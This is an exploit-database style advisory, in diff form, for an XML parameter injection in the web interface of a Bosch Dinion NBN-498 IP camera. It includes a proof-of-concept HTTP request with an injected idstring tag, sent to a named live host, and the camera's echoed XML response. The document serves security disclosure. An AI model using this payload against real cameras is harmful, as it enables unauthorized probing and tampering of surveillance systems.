@@ -1,0 +1,100 @@
+# Exploit Title: Bosch Security Systems - XML Injection - Dinion NBN-498 Web Interface
+
+# Date: 01/09/2015
+
+# Exploit Author: neom22
+
+# Vendor Homepage: http://us.boschsecurity.com
+
+# Data Sheet: http://resource.boschsecurity.us/documents/Data_sheet_enUS_9007201286798987.pdf
+
+# Version: Hardware Firmware 4.54.0026 - Web Interface version is unknown
+
+# Tested on: Windows 8.1 - Firefox 40.0.3
+
+# CVE : CVE-2015-6970 (To be published)
+
+
+#################################################
+#                                                                                                        #
+#    Discovered by neom22                                                           #
+#    23 - 09 - 2015                                                                           #
+#                                                                                                        #
+#################################################
+#
+#
+Bosch Security Systems - Dinion NBN-498 - Web Interface (Live Feed and Administration)
+#
+#
+Vulnerability Discovery: 10/09/2015
+Vendor Contact: 17/09/2015 (no answer)
+Published: 24/09/2015
+#
+#
+
+Description: 
+-----------------------------------------------------------------
+The Dinion2x IP Day/Night camera is a high-performance, smart
+surveillance color camera. It incorporates 20-bit digital signal
+processing and a wide dynamic range sensor for outstanding
+picture performance under all lighting conditons.
+The camera uses H.264 compression technology to give clear
+images while reducing bandwidth and storage requirements. It
+is also ONVIF compliant to improve compatibility during system
+integration.
+The camera operates as a network video server and transmits
+video and control signals over data networks, such as Ethernet
+LANs and the Internet.
+-----------------------------------------------------------------
+
+Useful Links:
+
+Data Sheet: http://resource.boschsecurity.us/documents/Data_sheet_enUS_9007201286798987.pdf
+Documentation: http://resource.boschsecurity.us/documents/Installation_Manual_enUS_2032074379.pdf
+Product: 
+
+http://us.boschsecurity.com/en/us_product/products/video/ipcameras/sdfixedcameras/nbn498dinion2xdaynightipc/nbn498
+
+dinion2xdaynightipc_608
+-----------------------------------------------------------------
+
+XML Parameter Injection POC
+
+_-Request-_
+
+GET /rcp.xml?idstring=<string>injection</string> HTTP/1.1
+Host: postoipiranga.dyndns-ip.com:10004
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: HcsoB=60cd4a687de94857
+Connection: keep-alive
+
+_-Response-_
+
+HTTP/1.1 200 OK
+Server: VCS-VideoJet-Webserver
+Connection: keep-alive
+Content-Type: text/xml
+Accept-Ranges: bytes
+Content-Length: 359
+Expires: 0
+Cache-Control: no-cache
+Set-Cookie: HcsoB=60cd4a687de94857; path=/;
+
+<rcp>
+    <command>
+        <hex>0x0000</hex>
+        <dec>       0</dec>
+    </command>
+    <type>T_DWORD</type>
+    <direction>READ</direction>
+    <num>0</num>
+    <idstring><string>injection</string></idstring>
+    <payload></payload>
+<cltid>0x478e</cltid><sessionid>0x00000000</sessionid><auth>1</auth><protocol>TCP</protocol>    <result>
+            <err>0x40</err>
+    </result>
+</rcp>
+ 		 	   		   		 	   		  
